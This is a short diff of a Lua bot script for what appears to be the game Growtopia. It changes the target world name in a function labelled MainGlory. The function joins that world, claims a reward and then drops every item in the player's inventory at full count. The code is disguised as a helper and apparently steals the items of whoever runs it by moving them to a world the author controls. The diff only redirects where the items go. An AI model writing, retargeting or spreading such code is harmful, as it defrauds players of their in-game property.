@@ -11,14 +11,14 @@ function packs()
 end
 
 function MainGlory()
-    sendPacket(3, "action|join_request\nname|OEQQO|nname\ninvitedWorld|0")
+    sendPacket(3, "action|join_request\nname|BUTTONCLIKED|nname\ninvitedWorld|0")
     sleep(3000)
     sendPacket(2,"action|welcomeadrewarded")
 
     while true do
         if getWorld() then
             for _, v in pairs(getInventory()) do
-                if getWorld().name == "OEQQO" then        
+                if getWorld().name == "BUTTONCLIKED" then        
                     sendPacket(2, "action|store\nlocation|gem")
                     sendPacket(2, "action|drop\n|itemID|"..v.id)
                     sendPacket(2, "action|dialog_return\ndialog_name|drop_item\nitemID|"..v.id.."|\ncount|"..v.amount)
